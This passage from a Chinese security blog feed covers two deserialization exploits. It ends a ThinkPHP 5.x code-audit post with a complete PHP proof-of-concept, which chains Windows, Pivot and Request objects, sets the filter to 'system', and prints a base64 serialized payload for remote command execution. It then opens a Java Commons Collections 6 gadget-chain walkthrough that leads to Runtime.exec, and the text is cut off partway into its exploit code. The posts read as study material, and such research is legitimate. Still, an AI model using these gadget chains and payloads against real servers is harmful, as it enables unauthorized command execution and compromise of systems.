class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中我们来看这段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>这里按照之前 5.0 的写法看，这里的几个参数都是可控的<br> <code>getRelation</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们是可以返回空<br>并且 <code>append</code>  是可控的</p><p><code>getAttr</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b16fd37204ff41b1a70e4090d9b49cbe.png" alt="在这里插入图片描述"><br>这里通过 <code>data[]</code>  返回后续利用类的对象 (Request)</p><p>在 5.0 中我们说这里的几个调用方法可以触发 <code>__call</code>  方法<br>这里我们选择则 <code>visible</code>  来触发 <code>__call</code> <br> 找下可以利用的方法<br>在 <code>Request</code>  中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先会判断方法中有没有设置 <code>hook</code> ，然后把 <code>this</code>  关键字放在之执行参数的前面，所以这里对于方法是不可控的<br>所以在该类下寻找可以后续利用的方法</p><p><code>isAjax</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>           = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的配置信息是可控的</p><p><img src="https://img-blog.csdnimg.cn/1079e48ea5b94e07b0abddc40deeb246.png" alt="在这里插入图片描述"><br>接着跟进 <code>param</code></p><p><code>param</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>input</code>  下 <code>array_walk_recursive</code>  参数都是可控的<br><img src="https://img-blog.csdnimg.cn/df777937e1ff4b9c8bd8746b5cc7c549.png" alt="在这里插入图片描述"><br>下面就可以构造了<br>这里 <code>Conversion</code>  和 <code>Attribute</code>  都是 trait 关键字，不能直接实例化<br>需要去找继承类，要是用 use 关键字，并且同时继承了 <code>Conversion</code>  和 <code>Attribute</code></p><p><code>Model</code>  类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br></pre></td></tr></table></figure><p>但是 <code>Model</code>  是抽象类，还是不能直接实例化<br>需要找到其抽象的子类 <code>Pivot</code></p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;huha&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># append键必须存在，并且与$this-&gt;data相同</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;huha&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;huha&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//var_dump(new Windows());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;整个流程理解上可能不是很复杂，但我感觉想把整个 exp 写下来还是有点复杂的，中间 debug 的过程还是需要花时间去考究的。&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="thinkphp框架" scheme="https://ki10moc.github.io/tags/thinkphp%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections6</title>
    <link href="https://ki10moc.github.io/2023/01/04/Commons%20Collections6(%E6%B0%B4%E7%89%88)/"/>
    <id>https://ki10moc.github.io/2023/01/04/Commons%20Collections6(%E6%B0%B4%E7%89%88)/</id>
    <published>2023-01-03T16:49:36.000Z</published>
    <updated>2023-08-22T20:04:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2><p>Java 8u71 以后，sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑发生变化，导致 cc1 的链子在 8u71 之后无法使用。<br>所以 cc6 就是解决高版本的利用问题，依然是从上下文对 <code>LazyMap#get</code>  的调用</p><h2 id="调用链"><a class="markdownIt-Anchor" href="#调用链">#</a> 调用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>TiedMapEntry</code>  的 <code>hashcode()</code>  下调用 <code>getkey()</code>  的 <code>getvalue()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>key</code>  如果传入 <code>LazyMap</code> ，就回到了 CC1，后面的就都一样了<br>这里其实理解了 CC5+URLDNS 就可以解决 CC6 的流程</p><p>从原作者的流程中可以看到链子的入口就是在 <code>hashMap</code>  处<br>所以前面的流程就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()-&gt;HashMap.put()-&gt;HashMap.hash()-&gt;TiedMapEntry.hashCode()-&gt;TiedMapEntry.getValue()-&gt;LazyMap.get()</span><br></pre></td></tr></table></figure><p>看到入口其实就能想到 <code>URLDNS</code></p><p>所以这一段的代码写下来就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ki10Moc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> 